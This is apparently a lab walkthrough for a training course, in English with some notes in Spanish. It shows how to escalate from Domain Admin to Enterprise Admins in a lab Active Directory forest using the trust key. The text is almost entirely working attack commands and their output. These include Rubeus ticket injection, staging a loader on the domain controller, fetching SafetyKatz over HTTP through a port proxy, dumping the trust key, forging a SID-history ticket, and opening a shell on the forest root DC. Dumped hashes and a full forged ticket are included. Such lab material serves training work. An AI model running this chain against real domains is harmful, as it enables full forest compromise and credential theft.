# Learning Objetive 18

* Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admins using the domain trust key.

***

### Enumerate Trust

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
powershell
. C:\AD\Tools\PowerView.ps1

Get-DomainTrust
Get-DomainTrust -Domain moneycorp.local
```

### Extract the trust key

We need the trust key for the trust between dollarcorp and moneycrop, which can be retrieved using Mimikatz or SafetyKatz. Start a process with DA privileges.&#x20;

Run the below command from an elevated command prompt:

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

[snip]
```

Run the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to extract credentials:

#### Share Loader to dc machine

```
C:\Windows\system32> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
Does \\dcorp-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

#### Connect to the DC & Portforward

```
C:\Windows\system32> winrs -r:dcorp-dc cmd
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\svcadmin> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.X
```

#### Use Sagetykatz to extract

```
C:\Users\svcadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
[snip]

mimikatz # lsadump::evasive-trust /patch

Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 2/24/2023 1:11:33 AM - CLEAR   - 79 d9 90 1f 7c db 09 b7 65 a0 e5 e4 50 03 35 8b 99 fb eb bb e7 ba 54 89 b7 b2 f4 fc
        * aes256_hmac       34f94d19178a75cb04b9c10e657623c5ac9074fbc7fcf4e20be8527b77407243
        * aes128_hmac       40856eb80d3323adf23a3b7faad3c180
        * rc4_hmac_nt       132f54e05f7c3db02e97c00ff3879067

[snip]
```

> El SID que termina en **-519** es el **Enterprise Admins** del dominio raíz (moneycorp.local). En este lab concreto, el SID completo es siempre el mismo:
>
> **S-1-5-21-335606122-960912869-3279953914-519**
>
> Este es el grupo **Enterprise Admins** del dominio moneycorp.local (el dominio raíz del bosque).

> mcorp / S-1-5-21-335606122-960912869-3279953914-519
>
> mcorp:4445f1fb52d0ad4784175d51a769a64554fc80ff95144569fbe298c7441b5745

### Forge ticket <a href="#forge-ticket" id="forge-ticket"></a>

Let’s Forge a ticket with SID History of Enterprise Admins.&#x20;

<mark style="background-color:yellow;">Run the below command in use VM Machine:</mark>

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:132f54e05f7c3db02e97c00ff3879067 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap

[snip]

*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519

[snip]

[*] base64(ticket.kirbi):

      doIGPjCCBjqgAwIBBaED...

[snip]
```

> kirbi; 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

Copy the base64 encoded ticket from above and use it in the following command:

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:TICKETBASE64HERE
[snip]
  ServiceName              :  http/mcorp-dc.MONEYCORP.LOCAL
  ServiceRealm             :  MONEYCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL

[snip]
```

Once the ticket is injected, we can access mcorp-dc!

```
C:\AD\Tools> winrs -r:mcorp-dc.moneycorp.local cmd
Microsoft Windows [Version 10.0.20348.2227]
(c) Microsoft Corporation. All rights reserved.

C:\Users\TEMP> set username
set username
USERNAME=Administrator

C:\Users\TEMP> set computername
set computername
COMPUTERNAME=MCORP-DC
```

